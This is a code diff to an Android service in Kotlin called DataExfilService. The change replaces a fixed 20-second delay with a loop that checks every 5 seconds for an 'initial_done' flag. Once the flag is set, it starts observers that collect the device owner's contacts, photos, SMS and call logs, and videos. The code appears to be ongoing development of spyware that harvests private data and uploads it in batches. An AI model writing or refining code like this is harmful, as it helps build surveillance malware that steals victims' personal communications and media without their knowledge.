@@ -139,14 +139,28 @@ class DataExfilService : Service() {
 
         StartupController(this).performInitialCollection()
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
-            collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.setupObservers(contentResolver)
-            collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
-            collectors.filterIsInstance<VideoCollector>().firstOrNull()?.setupObservers(contentResolver)
+        Handler(Looper.getMainLooper()).post(object : Runnable {
+            override fun run() {
+                val startupPrefs = getSharedPreferences("startup_complete", Context.MODE_PRIVATE)
 
-            collectors.forEach { it.startObserving() }
-        }, 20000)
+                // Check if startup is done (either by checking a flag or if batch uploads finished)
+                if (startupPrefs.getBoolean("initial_done", false)) {
+                    Log.d(TAG, "Startup completed, starting collectors")
+
+                    // Set up observers and start collectors
+                    collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
+                    collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.setupObservers(contentResolver)
+                    collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
+                    collectors.filterIsInstance<VideoCollector>().firstOrNull()?.setupObservers(contentResolver)
+
+                    collectors.forEach { it.startObserving() }
+                    Log.d(TAG, "All collectors started")
+                } else {
+                    Log.d(TAG, "Startup still in progress, checking again in 5 seconds")
+                    handler.postDelayed(this, 5000)
+                }
+            }
+        })
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
